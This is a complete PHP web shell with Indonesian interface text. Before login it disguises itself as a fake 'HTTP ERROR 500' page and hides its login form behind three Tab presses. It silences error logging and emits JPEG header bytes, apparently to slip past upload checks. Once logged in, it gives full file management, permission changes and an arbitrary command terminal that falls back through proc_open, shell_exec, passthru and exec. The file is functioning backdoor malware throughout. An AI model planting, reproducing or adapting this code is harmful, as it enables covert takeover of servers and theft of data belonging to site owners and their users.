<?php
ob_start();
echo "\xFF\xD8\xFF\xE0\x4A\x46\x49\x46"; ob_clean();
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');
@ini_set('error_reporting', 0);
error_reporting(0);

$a = '/tmp';
$b = __DIR__ . '/sess';
if (!@is_dir($a)) {
    if (!@is_dir($b)) @mkdir($b, 0777, true);
    @ini_set('session.save_path', $b);
} else {
    @ini_set('session.save_path', $a);
}
@session_name('sessid');
@session_start();

$username = "djawa";
$passwordHash = "23af4255c402219567c3267063514c29"; // md5('password')
function generateUUID() {
    return function_exists('random_bytes') ? bin2hex(random_bytes(16)) : md5(uniqid('', true));
}

$err = '';
if (isset($_POST['username']) && isset($_POST['password'])) {
    $inputUsername = $_POST['username'];
    $inputPassword = md5($_POST['password']);
    if ($inputUsername === $username && $inputPassword === $passwordHash) {
        $_SESSION['token'] = generateUUID();
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $username;
        header("Location: " . $_SERVER["PHP_SELF"]);
        exit;
    } else {
        $err = "Login gagal!";
    }
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title></title>
<style>
html,body{margin:0;padding:0;background:#1e1e1e;font-family:sans-serif;color:#9AA0A5;height:100%;display:flex;align-items:center;justify-content:center;cursor:none}
.container{text-align:left;max-width:500px;margin-left:30px;transform:translate(-20px,-40px)}
.title{font-size:23px;font-weight:400;margin-bottom:6px}
.desc{font-size:17px;color:#aaa;margin-bottom:10px}
.domain{font-weight:bold;color:#9AA0A5}
.code{font-size:16px;color:#777;margin-top:6px}
.button{margin-top:20px;padding:8px 18px;background-color:#8798b4;color:black;border:none;border-radius:16px;font-weight:bold;cursor:pointer}
.button:hover{background-color:#a5c9ff}
#login-box{position:absolute;top:30px;left:30px;background:#1a1a1a;padding:16px;border-radius:10px;display:none;box-shadow:0 0 10px rgba(255,255,255,0.05)}
#login-box input{display:block;width:180px;padding:6px;margin:8px 0;background:#111;border:1px solid #333;color:#eee;border-radius:5px}
#login-box input:focus{outline:none;border:1px solid #555}
#login-box button{display:none}
.error-msg{position:absolute;top:10px;left:10px;color:#ff4d4d;font-size:15px}
.cursor-light{position:fixed;top:0;left:0;width:160px;height:6px;background:rgba(255,255,255,0.1);border-radius:100px;pointer-events:none;z-index:9999;filter:blur(10px);transform:translate(-50%,-50%) scaleX(2.5)}
</style>
<script>
let glow=document.createElement("div");
glow.className="cursor-light";
document.body.appendChild(glow);
document.addEventListener("mousemove",function(e){
glow.style.left=e.clientX+"px";
glow.style.top=e.clientY+"px";
});
</script>
</head><body>
<div class="container">
  <div class="title">This page isn’t working</div>
  <div class="desc"><span class="domain" id="domain-name"></span> is currently unable to handle this request.</div>
  <div class="code">HTTP ERROR 500</div>
  <button class="button" onclick="location.reload()">Reload</button>
</div>
<?php if (!empty($err)) echo "<div class='error-msg'>$err</div>"; ?>
<form id="login-box" method="POST">
  <input type="text" name="username" autocomplete="off">
  <input type="password" name="password" autocomplete="off">
  <button type="submit">Login</button>
</form>
<script>
document.title = window.location.hostname;
document.getElementById("domain-name").textContent = window.location.hostname;
let tabCount = 0;
document.addEventListener("keydown", function(e) {
  if (e.key === "Tab") {
    tabCount++;
    if (tabCount >= 3) {
      document.getElementById("login-box").style.display = "block";
      document.querySelector("#login-box input[name='username']").focus();
      tabCount = 0;
    }
  } else {
    tabCount = 0;
  }
});
document.querySelector("#login-box input[name='password']").addEventListener("keydown", function(e) {
  if (e.key === "Enter") document.getElementById("login-box").submit();
});
</script></body></html>
<?php exit; }

$tmp = function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner(__FILE__)) : get_current_user();
$system_user = is_array($tmp) ? $tmp['name'] : $tmp;
$cwd = isset($_GET["d"]) ? $_GET["d"] : getcwd();
if (strpos($cwd, '..') !== false || !@chdir($cwd)) $cwd = getcwd();
if (isset($_FILES["upfile"]["tmp_name"])) {
    $name = basename($_FILES["upfile"]["name"]);
    $dest = $cwd . "/" . $name;
    if (is_uploaded_file($_FILES["upfile"]["tmp_name"])) @move_uploaded_file($_FILES["upfile"]["tmp_name"], $dest);
}
if (isset($_POST["mkdir"])) @mkdir($cwd . "/" . $_POST["mkdir"]);
if (isset($_POST["mkfile"])) @file_put_contents($cwd . "/" . $_POST["mkfile"], "");
if (isset($_GET["delete"])) {
    $target = realpath($cwd . "/" . $_GET["delete"]);
    if ($target && strpos($target, $cwd) === 0) {
        @is_dir($target) ? @rmdir($target) : @unlink($target);
    }
}
if (isset($_POST["rename_target"], $_POST["rename_new"])) @rename($cwd . "/" . $_POST["rename_target"], $cwd . "/" . $_POST["rename_new"]);
if (isset($_POST["editfile"], $_POST["content"])) {
    $target = realpath($cwd . "/" . $_POST["editfile"]);
    if ($target && strpos($target, $cwd) === 0) @file_put_contents($target, $_POST["content"]);
}
if (isset($_POST["chmod_target"], $_POST["chmod_val"])) {
    $target = realpath($cwd . "/" . $_POST["chmod_target"]);
    $val = preg_replace('/[^0-7]/', '', $_POST["chmod_val"]);
    if ($target && strlen($val) >= 3) @chmod($target, octdec($val));
}
function perms($file) {
    $p = @fileperms($file);
    if ($p === false) return '?????????';
    $t = ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
    $t .= ($p & 0x0100) ? 'r' : '-'; $t .= ($p & 0x0080) ? 'w' : '-'; $t .= ($p & 0x0040) ? 'x' : '-';
    $t .= ($p & 0x0020) ? 'r' : '-'; $t .= ($p & 0x0010) ? 'w' : '-'; $t .= ($p & 0x0008) ? 'x' : '-';
    $t .= ($p & 0x0004) ? 'r' : '-'; $t .= ($p & 0x0002) ? 'w' : '-'; $t .= ($p & 0x0001) ? 'x' : '-';
    return $t;
}

echo <<<HTML
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Simple Shell</title>
<style>body{background:#000;color:#0ff;font-family:monospace;padding:20px}input,textarea{background:#000;color:#0ff;border:1px solid #0ff;padding:5px;margin:3px}input[type=submit]{cursor:pointer}a{color:#0ff;text-decoration:none;margin-right:10px}a:hover{text-shadow:0 0 5px #0ff}.box{border:1px solid #0ff;padding:10px;margin:10px 0}.actions{display:inline-block;margin-left:10px}.chmod-text{cursor:pointer}.chmod-input{background:#111;color:#0ff;border:1px solid #0ff;padding:2px;width:50px;display:none}</style>
</head><body><h2 style="color:#0ff">Simple Shell | Login: YES</h2><div class=box><b>Current Dir:</b>
HTML;

$parts = explode("/", $cwd);
$build = "";
foreach ($parts as $i => $part) {
    if ($part == "" && $i == 0) { $build = "/"; echo '<a href="?d=/">/</a>'; continue; }
    if ($part == "") continue;
    $build .= ($build == "/" ? "" : "/") . $part;
    echo '/<a href="?d=' . $build . '">' . $part . '</a>';
}

echo <<<HTML
</div><div class=box style="display:flex;flex-wrap:wrap;gap:10px;align-items:center;">
<form method=post enctype=multipart/form-data style="display:inline-flex;align-items:center;"> Upload: <input type=file name=upfile> <input type=submit value=Upload></form>
<form method=post style="display:inline-flex;align-items:center;"> Create File: <input name=mkfile> <input type=submit value=Create></form>
<form method=post style="display:inline-flex;align-items:center;"> Create Dir: <input name=mkdir> <input type=submit value=Create></form></div>
<div class=box><b>Directory Content:</b><div style="display:flex;flex-direction:column;gap:4px;">
HTML;

$items = @scandir($cwd);
$dirs = $files = [];
foreach ($items ?: [] as $f) {
    if ($f === '.' || $f === '..') continue;
    $path = $cwd . '/' . $f;
    is_dir($path) ? $dirs[] = $f : $files[] = $f;
}
foreach (array_merge($dirs, $files) as $f) {
    $path = $cwd . '/' . $f;
    $isDir = is_dir($path);
    $perm = perms($path);
    $ownerRaw = function_exists('posix_getpwuid') ? @posix_getpwuid(@fileowner($path)) : null;
    $owner = is_array($ownerRaw) ? $ownerRaw['name'] : get_current_user();
    $fid = md5($path);
    $color = (substr(sprintf('%o', fileperms($path)), -4) === '0000') ? '#f33' : '#0ff';
    echo "<form method=post style='display:flex;gap:20px;align-items:center;'>";
    echo "<div style='width:60px;'>" . ($isDir ? '[DIR]' : '[FILE]') . "</div>";
    echo "<div style='min-width:300px;'><a href='?d=$path'>$f</a></div>";
    echo "<div style='width:150px;color:#0ff;'>$owner</div>";
    echo "<div style='width:90px;'><span id='chmod-text-$fid' class='chmod-text' style='color:$color' onclick='toggleChmod(\"chmod-text-$fid\",\"chmod-input-$fid\")'>$perm</span><input id='chmod-input-$fid' class='chmod-input' value='755' onkeydown='submitChmod(event,this,\"$f\")'></div>";
    echo "<div class='actions'><a href='?d=$cwd&delete=$f' onclick='return confirm(\"Delete $f?\")'>Delete</a> ";
    echo "<a href='#' onclick='renamePrompt(\"$f\")'>Rename</a> ";
    if (!$isDir) echo "<a href='?d=$cwd&edit=$f'>Edit</a>";
    echo "</div></form>";
}
echo <<<HTML
</div></div><div id=renameForm class=box style="display:none;"><form method=post><input type=hidden name=rename_target id=rename_target> Rename to: <input name=rename_new id=rename_new> <input type=submit value=Rename></form></div>
HTML;

if (isset($_GET["edit"])) {
    $f = basename($_GET["edit"]);
    $path = realpath($cwd . "/" . $f);
    if ($path && strpos($path, $cwd) === 0 && is_file($path)) {
        $src = @file_get_contents($path);
        echo "<div class=box><form method=post>";
        echo "<input type=hidden name=editfile value='$f'>";
        echo "<b>Editing: $f</b><br>";
        echo "<textarea name=content rows=20 cols=100>" . htmlentities($src) . "</textarea><br>";
        echo "<input type=submit value=Save></form></div>";
    }
}

echo <<<HTML
<script>
function renamePrompt(f){document.getElementById('rename_target').value=f;document.getElementById('rename_new').value=f;document.getElementById('renameForm').style.display='block'}
function toggleChmod(t,i){document.getElementById(t).style.display='none';document.getElementById(i).style.display='inline-block';document.getElementById(i).focus()}
function submitChmod(e,i,f){
  if(e.key==='Enter'){
    e.preventDefault();
    var v=i.value;
    var form=document.createElement('form');
    form.method='POST';
    form.style.display='none';
    form.action=location.href;
    var t=document.createElement('input');
    t.name='chmod_target';t.type='hidden';t.value=f;
    var v2=document.createElement('input');
    v2.name='chmod_val';v2.type='hidden';v2.value=v;
    form.appendChild(t);form.appendChild(v2);
    document.body.appendChild(form);form.submit();
  }
}
</script></body></html>
HTML;
?>
<!-- Terminal Eksekusi -->
<div class="box" style="margin-top:20px;padding:10px;border:1px solid #0ff;background:#000;">
  <form method="post" style="display:flex;gap:10px;">
    <input type="text" name="terminal_cmd" placeholder="welcome.." style="flex:1;background:#000;color:#0ff;border:1px solid #0ff;padding:6px;font-family:monospace;">
    <input type="submit" value="Run" style="background:#0ff;color:#000;font-weight:bold;padding:6px 12px;border:none;cursor:pointer;">
  </form>
<?php
if (isset($_POST['terminal_cmd'])) {
  $cmd = $_POST['terminal_cmd'];
  echo "<div style='margin-top:10px;background:#111;padding:10px;border:1px solid #0ff;color:#0ff;font-family:monospace;white-space:pre-wrap'>";
  echo "<b>Command:</b> " . htmlspecialchars($cmd) . "<br><br><b>Output:</b><br>";

  if (function_exists('proc_open')) {
    $des = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $proc = proc_open($cmd, $des, $pipes);
    if (is_resource($proc)) {
      echo htmlspecialchars(stream_get_contents($pipes[1]));
      fclose($pipes[1]);
      echo htmlspecialchars(stream_get_contents($pipes[2]));
      fclose($pipes[2]);
      proc_close($proc);
    }
  } elseif (function_exists('shell_exec')) {
    echo htmlspecialchars(shell_exec($cmd));
  } elseif (function_exists('passthru')) {
    ob_start(); passthru($cmd); echo htmlspecialchars(ob_get_clean());
  } elseif (function_exists('exec')) {
    $out = []; exec($cmd, $out); echo htmlspecialchars(implode("\n", $out));
  } else {
    echo "disable.";
  }

  echo "</div>";
}
?>
</div>
<?php ob_end_flush(); ?>